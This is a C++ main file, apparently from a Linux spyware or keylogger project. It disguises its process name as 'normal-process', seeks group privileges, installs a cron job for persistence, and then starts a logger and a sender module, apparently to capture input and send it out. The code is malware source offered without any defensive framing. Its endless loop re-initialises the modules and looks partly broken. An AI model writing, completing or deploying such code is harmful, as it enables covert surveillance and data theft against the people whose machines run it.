// main.cpp

#include "logger.h"
#include "procloader.h"
#include "sender.h"
#include <sys/prctl.h>

#include <cstring>

int main() {
	auto usrgrp = false;
	auto crnjob = false;

	while (true) {
		char const* pr_name = "normal-process";
		prctl(PR_SET_NAME, pr_name, 0, 0, 0);

		procloader& procloader = procloader::get_instance();

		if (usrgrp && crnjob) {
			logger& logger = logger::get_instance();
			sender& sender = sender::get_instance();

			if (!logger.init()) {
				continue;
			}

			if (!sender.init()) {
				continue;
			}

			logger.start();
			sender.start();
		}
		else {
			usrgrp = procloader::get_instance().grpriv();
			crnjob = procloader.mkcron();
		}
	}

	return 0;
}
